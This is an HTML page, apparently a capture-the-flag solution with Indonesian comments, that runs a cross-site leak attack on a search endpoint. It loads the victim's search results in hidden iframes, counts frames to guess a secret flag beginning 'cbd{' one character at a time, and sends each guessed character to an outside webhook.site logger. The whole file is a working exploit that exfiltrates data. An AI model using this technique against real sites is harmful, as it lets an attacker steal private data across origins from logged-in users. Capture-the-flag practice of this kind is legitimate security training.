<!DOCTYPE html>
<html>
<body>
    <script>
        const TARGET = "https://wonder.cbd2026.cloud/search?q=";
        const LOGGER = "https://webhook.site/fb0f12dc-6949-4193-ac04-768d43746e00";
        
        // Alfabet lengkap: Huruf Kecil, Huruf Besar, Angka, dan Simbol Umum
        const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@-}"; 

        async function check(q) {
            return new Promise(resolve => {
                const ifr = document.createElement('iframe');
                ifr.src = `${TARGET}${encodeURIComponent(q)}`;
                ifr.style.display = "none";
                document.body.appendChild(ifr);
                
                setTimeout(() => {
                    const isMatch = ifr.contentWindow.length > 0;
                    document.body.removeChild(ifr);
                    resolve(isMatch);
                }, 800); // Dipercepat ke 800ms agar lebih banyak karakter tertebak sebelum bot mati
            });
        }

        async function solve(current) {
            // Beri tahu kita lagi nyari apa sekarang
            fetch(`${LOGGER}?searching_at=${current}`);
            
            // Cek 10 karakter sekaligus secara paralel
            for (let i = 0; i < ALPHABET.length; i += 10) {
                const chunk = ALPHABET.slice(i, i + 10).split('');
                const results = await Promise.all(chunk.map(c => check(current + c)));
                
                for (let j = 0; j < results.length; j++) {
                    if (results[j]) {
                        const found = current + chunk[j];
                        fetch(`${LOGGER}?found=${found}`);
                        if (chunk[j] === '}') return;
                        return solve(found); 
                    }
                }
            }
        }

        // Jalankan!
        solve("cbd{");
    </script>
</body>
</html>
